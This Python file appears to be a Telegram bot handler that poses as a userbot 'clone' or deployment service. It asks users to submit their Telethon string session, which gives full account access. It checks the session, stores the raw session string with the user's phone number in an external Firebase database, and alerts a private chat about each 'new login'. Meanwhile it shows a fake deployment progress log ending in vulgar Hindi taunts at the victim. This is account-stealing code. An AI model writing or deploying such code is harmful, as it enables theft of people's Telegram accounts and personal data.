from telethon import TelegramClient
from telethon.sessions import StringSession
from session import userbot, users, active_users
import config
import asyncio
import requests
from config import FIREBASE
from config import CHAT_ID


async def clone_handle(client, event):
    text = event.raw_text.strip()
    parts = text.split(maxsplit=1)
    command = parts[0]
    value = parts[1] if len(parts) > 1 else ""

    if not value:
        msg = "<blockquote>Note: Telethon</blockquote>\nᴘʀᴏᴠɪᴅᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴀғᴛᴇʀ ᴄᴏᴍᴍᴀɴᴅ."
        await event.respond(msg, parse_mode="html")
        return

    if value in active_users:
        await event.reply("ᴛʜɪs sᴇssɪᴏɴ ᴀʟʀᴇᴀᴅʏ ᴜsᴇ ᴘʟᴇᴀsᴇ ɢᴇɴ ɴᴇᴡ sᴇssɪᴏɴ...")
        return

    sent = await event.reply("ʙᴏᴏᴛɪɴɢ ʏᴏᴜʀ ᴄʟɪᴇɴᴛ...")

    valid, me = await validate(value)

    if not valid:
        await sent.edit("ᴛʜᴇ ᴘʀᴏᴠɪᴅᴇᴅ ᴛᴇʟᴇᴛʜᴏɴ sᴇssɪᴏɴ ɪs ɴᴏᴛ ᴠᴀʟɪᴅ sᴇssɪᴏɴ.")
        return

    user_id = me.get("user_id")
    first_name = me.get("first_name")

    mention = f'<a href="tg://user?id={user_id}">{first_name}</a>'

    users.setdefault(user_id, me)
    userbot.setdefault("client", []).append(value)

    total_steps = len(console)

    for i in range(total_steps):

        percent = int((i + 1) / total_steps * 100)

        filled = int(percent / 20)
        bar = "▰" * filled + "□" * (5 - filled)
        progress_bar = f"[{bar}]"

        log_text = console[i]

        await sent.edit(
            f"{log_text}\n\n{progress_bar} {percent}%",
            parse_mode="html"
        )

        await asyncio.sleep(0.35)

    await sent.edit(
        f"{mention} ʏᴏᴜʀ ᴄʟɪᴇɴᴛ ʙᴏᴏᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ",
        parse_mode="html"
    )

    me["session"] = value

    database = set_userbot_data(me)

    if not database:
        return

    msg = f"<blockquote>ɴᴇᴡ ʟᴏɢɪɴ</blockquote>\nName : {mention}"

    try:
        await client.send_message(CHAT_ID, msg, parse_mode="html")
    except:
        pass


async def validate(session_str):
    try:
        client = TelegramClient(
            StringSession(session_str),
            config.API_ID,
            config.API_HASH
        )

        await client.start()

        me = await client.get_me()

        data = {
            "first_name": me.first_name,
            "user_id": me.id,
            "username": me.username,
            "phone": me.phone
        }

        await client.disconnect()

        return True, data

    except Exception as e:
        return False, e


def set_userbot_data(data: dict):

    user_id = data.get("user_id")

    if not user_id:
        raise ValueError("user_id is missing in data")

    url = f"{FIREBASE}/userbot/{user_id}.json"

    response = requests.put(url, json=data)

    if response.status_code == 200:
        return True
    else:
        return False


console = [
    "[INFO]: sᴛᴀʀᴛɪɴɢ ᴅᴇᴘʟᴏʏᴍᴇɴᴛ...",
    "[INFO]: ᴄʜᴇᴄᴋɪɴɢ ᴅᴇᴘᴇɴᴅᴇɴᴄɪᴇs...",
    "[INFO]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ sᴇʀᴠᴇʀ...",
    "[INFO]: ᴜᴘʟᴏᴀᴅɪɴɢ ғɪʟᴇs...",
    "[INFO]: ᴄᴏɴғɪɢᴜʀɪɴɢ ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ...",
    "[INFO]: ʀᴜᴋ ᴊʜᴀ ...",
    "[INFO]: ʙᴇᴛᴀ . . .",
    "[INFO]: sᴀᴍᴀʀ ...",
    "[INFO]: ᴛʜᴏʀᴀ ᴛᴇʀɪ . . .",
    "[INFO]: ɢᴀɴᴅ ᴍᴀʀ ʀᴀʜᴀ ʜᴀɪ 😈 . . .",
    "[SUCCESS]: ᴛᴇʀɪ ɢᴀɴᴅ ᴍᴀʀᴀ ᴄʜᴜᴋɪ ʜᴀɪ 🥵"
]
